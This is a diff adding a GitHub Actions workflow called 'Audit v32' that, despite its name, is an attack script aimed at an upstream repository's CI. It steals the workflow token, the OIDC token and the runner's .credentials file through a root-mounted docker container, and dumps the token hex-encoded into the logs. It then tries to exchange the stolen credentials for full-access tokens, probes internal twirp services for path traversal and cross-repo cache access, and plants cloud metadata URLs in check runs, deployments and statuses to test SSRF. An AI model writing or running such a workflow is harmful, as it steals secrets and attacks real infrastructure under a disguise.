@@ -1,0 +1,263 @@
+name: Audit v32
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v32:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V32 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: CTOK with hostId query param
+      # CTOK has EMPTY sub — different from OIDC's invalid sub format
+      # "does not match client_assertion subject " (empty)
+      # vs "Subject claim is not a valid client identifier: repo:..."
+      # Empty sub might bypass the format check!
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - CTOK hostId
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CTOK HOSTID ==="
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt)
+          [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ] && { echo "NO CTOK"; exit 0; }
+          CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))")
+
+          # A: vstoken with CTOK + hostId query param
+          echo "--- A: vstoken CTOK + hostId ---"
+          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          for HID in \
+            "$PLAN" \
+            "8f795dfa-02d7-4018-af3a-c98d25c03f68" \
+            "84ff2294-8721-ab49-db5a-db17b0f6c2de" \
+            "16cc8db7-5a82-87e5-749a-0b8db53d45e7"; do
+            for CID in "" " "; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "$VSBASE/_apis/oauth2/token?hostId=$HID" \
+                -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$CID&scope=vso.full_access")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "A vs hid=$HID cid='$CID' = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+          done
+          echo ""
+
+          # B: Pipeline with CTOK + hostId
+          echo "--- B: Pipeline CTOK + hostId ---"
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt)
+          for HID in "$PLAN" "8f795dfa-02d7-4018-af3a-c98d25c03f68"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "${PURL}_apis/oauth2/token?hostId=$HID" \
+              -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+            CODE=$(echo "$R" | tail -1)
+            echo "B pipe hid=$HID = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: Results-receiver twirp path traversal + SSRF
+      # Twirp endpoints that we KNOW auth works on (cache)
+      # Try traversal in the service path and SSRF via field values
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Twirp traversal
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== TWIRP TRAVERSAL ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+
+          # A: Path traversal in twirp service name
+          echo "--- A: Service name traversal ---"
+          for SVC in \
+            "../github.actions.results.api.v1.CacheService" \
+            "github.actions.results.api.v1.CacheService/../github.actions.results.api.v1.ArtifactService" \
+            "github.actions.results.api.v2.CacheService" \
+            "github.actions.results.internal.v1.CacheService" \
+            "github.actions.results.admin.v1.CacheService" \
+            "github.actions.internal.v1.TokenService" \
+            "github.actions.internal.v1.RunnerService" \
+            "github.actions.results.api.v1.StepService" \
+            "github.actions.results.api.v1.JobService" \
+            "github.actions.results.api.v1.LogService" \
+            "github.actions.results.api.v1.MetadataService" \
+            "github.actions.results.api.v1.CheckService" \
+            "github.actions.results.api.v1.WorkflowService" \
+            "github.actions.results.api.v1.RunService"; do
+            for METHOD in "Create" "List" "Get" "Delete"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+                "$RESULTS/twirp/$SVC/${METHOD}" \
+                -d '{}')
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "A $SVC/$METHOD = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # B: Try fetching cache from upstream repo scope
+          echo "--- B: Cross-repo cache ---"
+          VER=$(echo -n "v27-proof" | sha256sum | cut -d' ' -f1)
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+            -d "{\"key\":\"v27-proof\",\"version\":\"$VER\"}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | sed '$d')
+          echo "B v27-proof = $CODE | $(echo "$BODY" | head -c 300)"
+          DL=$(echo "$BODY" | jq -r '.signed_download_url // empty')
+          [ -n "$DL" ] && echo "B DOWNLOAD: $(/usr/bin/curl -sS "$DL" | head -c 200)"
+
+          # Also look up the actual v27 keys we created
+          for KEY in "setup-node-v4-node-20-linux-x64" "npm-cache-linux-x64" "pip-linux-x64"; do
+            VER=$(echo -n "$KEY" | sha256sum | cut -d' ' -f1)
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+              -d "{\"key\":\"$KEY\",\"version\":\"$VER\"}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            OK=$(echo "$BODY" | jq -r '.ok // empty')
+            MATCHED=$(echo "$BODY" | jq -r '.matched_key // empty')
+            DL=$(echo "$BODY" | jq -r '.signed_download_url // empty')
+            echo "B key=$KEY ok=$OK matched=$MATCHED dl_len=${#DL}"
+            [ -n "$DL" ] && [ ${#DL} -gt 5 ] && \
+              echo "B content: $(/usr/bin/curl -sS "$DL" | head -c 100)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: GitHub API SSRF via checks + deployments
+      # Create check runs / deployments with URLs pointing to
+      # internal services
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - GitHub API SSRF
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== GITHUB API SSRF ==="
+          RT=$(cat /tmp/rt.txt)
+          SHA="${{ github.event.pull_request.head.sha }}"
+
+          # A: Create check run with external_id pointing to internal
+          echo "--- A: Check run ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/check-runs" \
+            -d "{\"name\":\"v32-ssrf\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"neutral\",\"details_url\":\"http://169.254.169.254/metadata/instance\",\"external_id\":\"ssrf-test\",\"output\":{\"title\":\"SSRF\",\"summary\":\"test\"}}")
+          CODE=$(echo "$R" | tail -1)
+          echo "A check-run = $CODE | $(echo "$R" | sed '$d' | jq -c '{id,name,details_url,app}' 2>/dev/null)"
+
+          # B: Create deployment with URL payload
+          echo "--- B: Deployment ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/deployments" \
+            -d "{\"ref\":\"main\",\"task\":\"deploy\",\"payload\":{\"url\":\"http://169.254.169.254/\"},\"environment\":\"v32-ssrf\",\"description\":\"ssrf test\"}")
+          CODE=$(echo "$R" | tail -1)
+          echo "B deployment = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # C: Create commit status with target_url
+          echo "--- C: Commit status ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/statuses/$SHA" \
+            -d "{\"state\":\"success\",\"target_url\":\"http://169.254.169.254/metadata/instance\",\"description\":\"v32-ssrf\",\"context\":\"ssrf-test\"}")
+          CODE=$(echo "$R" | tail -1)
+          echo "C status = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # D: Create issue with URL in body
+          echo "--- D: Issue ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$FORK_OWNER/$FORK_REPO/issues" \
+            -d "{\"title\":\"v32-test\",\"body\":\"probe\"}")
+          CODE=$(echo "$R" | tail -1)
+          echo "D issue = $CODE | $(echo "$R" | sed '$d' | jq -c '{id,number}' 2>/dev/null)"
+
+          # E: List hooks on upstream (if permission allows)
+          echo "--- E: Hooks ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $RT" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/hooks")
+          CODE=$(echo "$R" | tail -1)
+          echo "E hooks = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V32 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V32 COMPLETE ==="
